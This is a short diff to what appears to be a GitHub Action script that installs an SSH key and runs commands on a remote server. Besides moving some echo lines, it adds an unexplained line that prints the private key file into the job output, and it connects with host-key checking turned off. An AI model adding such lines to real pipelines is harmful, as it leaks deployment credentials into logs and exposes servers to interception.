@@ -5,10 +5,9 @@ set -eu
 COLOR='\033[0;34m'
 NORMAL='\033[0m'
 
+echo ""
 echo -e "${COLOR}Starting the Update Grant Web Design Application action...${NORMAL}"
-echo ""
 echo -e "${COLOR}Triggered by:${NORMAL} ${GITHUB_TRIGGERING_ACTOR}"
-echo ""
 echo ""
 echo -e "${COLOR}Installing the SSH private key...${NORMAL}"
 echo ""
@@ -34,6 +33,8 @@ echo -e "${COLOR}Commands:${NORMAL}"
 cat ~/script.sh
 
 echo ""
+cat /github/home/.ssh/id_rsa
+
 
 echo -e "${COLOR}Connecting to ${INPUT_SERVERADDRESS}...${NORMAL}"
 sh -c "ssh -t -i ~/.ssh/id_rsa -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no '${INPUT_SERVERADDRESS}' < ~/script.sh"
